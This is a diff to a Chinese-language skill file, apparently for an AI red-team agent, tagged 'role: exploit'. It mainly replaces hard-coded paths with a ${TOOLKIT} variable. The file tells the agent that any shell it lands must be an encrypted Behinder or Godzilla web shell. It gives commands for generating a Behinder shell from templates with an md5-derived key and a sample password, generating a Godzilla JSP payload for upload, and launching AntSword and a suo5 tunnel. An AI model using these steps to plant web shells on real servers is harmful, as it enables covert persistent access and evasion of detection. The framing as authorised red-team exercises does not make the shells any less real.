@@ -6,9 +6,13 @@ role: exploit
 enabled: true
 ---
 
+> **路径约定**：下文的 `${TOOLKIT}` 指工具根目录 `$DSH_HOME/redteam/toolkit`（可在演练台「环境适配」里改）。
+> 工具一律放 `${TOOLKIT}/<工具名>/`，不要散落到 PATH 或 `~/.local/bin`。
+> 缺什么工具、装到哪、官方获取命令：跑 `redteam_preflight`，或看仓库 `docs/TOOLKIT.md`。
+
 # WebShell 工具包（已就位）
 
-目录 `$DSH_HOME/redteam/toolkit/`，Java 25 已安装。
+目录 `${TOOLKIT}/`，Java 25 已安装。
 
 ## 铁律：落地必须是冰蝎马 / 哥斯拉马（加密马）
 
@@ -20,10 +24,10 @@ enabled: true
 ## 无 GUI 生成冰蝎马（推荐，可脚本化）
 
 冰蝎马只是把密钥写进模板：密钥 = `md5(连接密码)[:16]`。仓库自带模板：
-`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`
+`${TOOLKIT}/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`
 
 ```bash
-TK=$DSH_HOME/redteam/toolkit
+TK=${TOOLKIT}
 PASS='Rt@2026#xz'                       # 连接密码（随机生成，别用 rebeyond）
 KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # 冰蝎要求 32 位 md5 的前 16 位
 # JSP：替换模板里的密钥
@@ -39,7 +43,7 @@ echo "连接密码 $PASS ｜ 密钥 $KEY"      # 两者都要写进 runs/ 与 re
 
 哥斯拉马（需要 GUI 时）：
 ```bash
-DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
+DISPLAY=:10.0 java -jar ${TOOLKIT}/Godzilla/godzilla.jar
 # 管理 → 生成：载荷 java/jsp、加密器 Java_AES_BASE64、密码与密钥随机 → 生成后上传
 ```
 
@@ -52,9 +56,9 @@ DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
 
 | 工具 | 启动命令 | 说明 |
 |---|---|---|
-| 冰蝎 Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |
-| 哥斯拉 Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |
-| 中国蚁剑 AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |
+| 冰蝎 Behinder v4.1 | `java -jar ${TOOLKIT}/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |
+| 哥斯拉 Godzilla v4.0.1 | `java -jar ${TOOLKIT}/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |
+| 中国蚁剑 AntSword | `${TOOLKIT}/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |
 | suo5 隧道 | `./suo5-linux-amd64` | 见技能 `suo5-tunnel` |
 
 ## 典型流程（授权演练）
